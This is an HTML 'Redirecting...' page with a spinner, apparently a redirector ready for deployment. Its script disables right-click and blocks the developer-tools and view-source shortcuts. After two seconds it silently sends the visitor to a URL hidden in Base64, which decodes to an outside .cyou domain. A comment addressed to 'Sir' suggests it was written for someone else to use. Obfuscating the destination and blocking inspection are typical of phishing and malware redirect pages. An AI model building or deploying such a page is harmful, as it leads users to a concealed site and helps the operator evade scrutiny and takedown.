<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Redirecting...</title>

<style>
    body {
        margin: 0;
        background: #ffffff;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .spinner {
        width: 70px;
        height: 70px;
        border-radius: 50%;
        border: 6px dotted #5659a8;
        animation: spin 1.2s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<script>
// Disable right click
document.addEventListener("contextmenu", e => e.preventDefault());

// Block F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C
document.onkeydown = function(e) {
    if (
        e.keyCode === 123 ||
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67)) ||
        (e.ctrlKey && e.keyCode === 85)
    ) {
        return false;
    }
};

// Sir will paste Base64 manually
const encoded = "aHR0cHM6Ly90ZWtvbi5jeW91L2NvbXQv";

// Redirect after 2 seconds
setTimeout(() => {
    window.location.href = atob(encoded);
}, 2000);
</script>

</head>
<body>
    <div class="spinner"></div>
</body>
</html>
